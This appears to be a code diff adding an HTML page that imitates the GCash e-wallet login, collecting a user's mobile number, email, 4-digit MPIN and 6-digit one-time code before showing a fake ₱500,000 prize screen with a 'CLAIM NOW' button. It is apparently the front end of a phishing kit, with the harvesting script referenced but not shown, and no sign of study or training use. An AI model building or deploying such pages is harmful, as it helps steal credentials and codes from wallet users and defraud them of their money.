@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GCash - Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="status-bar">
+        <div class="status-icons">
+            <div class="network-icons">
+                <div class="wifi-icon"></div>
+                <div class="signal-icon"></div>
+            </div>
+            <div class="battery-icon"></div>
+            <div class="time">12:30</div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="login-container">
+            <div class="logo-container">
+                <img src="images/gcash-logo-mobile.svg" alt="GCash Logo" class="logo">
+                <h1 class="app-name">GCash</h1>
+            </div>
+            
+            <!-- Phone Number Screen -->
+            <div class="screen" id="phone-screen" style="display: block;">
+                <h2>Enter your mobile number</h2>
+                
+                <form id="phone-form">
+                    <div class="mobile-input-group">
+                        <div class="country-code">+63</div>
+                        <input type="tel" id="phone-number" placeholder="123 456 7890" maxlength="10" required>
+                    </div>
+                    <div class="email-input-group">
+                        <input type="email" id="email-address" placeholder="Email address" required>
+                    </div>
+                    <p class="networks-text">Available for all networks!</p>
+                    <div class="error-message" id="phone-error"></div>
+                    <button type="submit" class="btn-primary">NEXT</button>
+                </form>
+            </div>
+            
+            <!-- PIN Screen -->
+            <div class="screen" id="pin-screen" style="display: none;">
+                <h2>Enter MPIN</h2>
+                <p class="subtitle">Please enter your 4-digit MPIN</p>
+                
+                <div class="user-info">
+                    <span id="display-phone"></span>
+                    <a href="#" id="change-number">Change</a>
+                </div>
+                
+                <form id="pin-form">
+                    <div class="pin-container">
+                        <input type="password" class="pin-input" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
+                        <input type="password" class="pin-input" maxlength="1" data-index="1" inputmode="numeric" pattern="[0-9]*">
+                        <input type="password" class="pin-input" maxlength="1" data-index="2" inputmode="numeric" pattern="[0-9]*">
+                        <input type="password" class="pin-input" maxlength="1" data-index="3" inputmode="numeric" pattern="[0-9]*">
+                    </div>
+                    <div class="error-message" id="pin-error"></div>
+                    <button type="submit" class="btn-primary" id="pin-submit" disabled>Next</button>
+                </form>
+                
+                <div class="help-text">
+                    <p><a href="#">Forgot MPIN?</a></p>
+                </div>
+            </div>
+            
+            <!-- OTP Screen -->
+            <div class="screen" id="otp-screen" style="display: none;">
+                <h2>Authentication Required</h2>
+                <p class="subtitle">Enter the 6-digit code sent to your email address</p>
+                
+                <div class="user-info">
+                    <span id="display-phone-otp"></span>
+                </div>
+                
+                <form id="otp-form">
+                    <div class="otp-container">
+                        <input type="text" class="otp-input" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric" pattern="[0-9]*">
+                        <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric" pattern="[0-9]*">
+                    </div>
+                    <div class="timer-container">
+                        <span id="timer">Resend code in <span id="countdown">30</span>s</span>
+                        <a href="#" id="resend-code" style="display: none;">Resend Code</a>
+                    </div>
+                    <div class="error-message" id="otp-error"></div>
+                    <button type="submit" class="btn-primary" id="otp-submit" disabled>Verify</button>
+                </form>
+            </div>
+            
+            <!-- Success Screen -->
+            <div class="screen" id="success-screen" style="display: none;">
+                <div class="success-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="64" height="64">
+                        <circle cx="12" cy="12" r="11" fill="#00b2e3"/>
+                        <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="white"/>
+                    </svg>
+                </div>
+                <h2 class="celebration-title">Congratulations!</h2>
+                <div class="money-container">
+                    <div class="money-icon">₱</div>
+                    <div class="money-amount">500,000</div>
+                </div>
+                <p class="subtitle celebration-text">You've won a cash prize!</p>
+                <p class="celebration-note">Claim your reward now!</p>
+                <div class="celebration-emojis">🎉 💰 🎊 💸 🎉</div>
+                <button type="button" class="btn-primary claim-button">CLAIM NOW</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="app-footer">
+        <div class="footer-left">Help Center</div>
+        <div class="footer-right">v12.12.2:222</div>
+    </footer>
+    
+    <script src="script.js"></script>
+    <script src="confetti.js"></script>
+</body>
+</html>
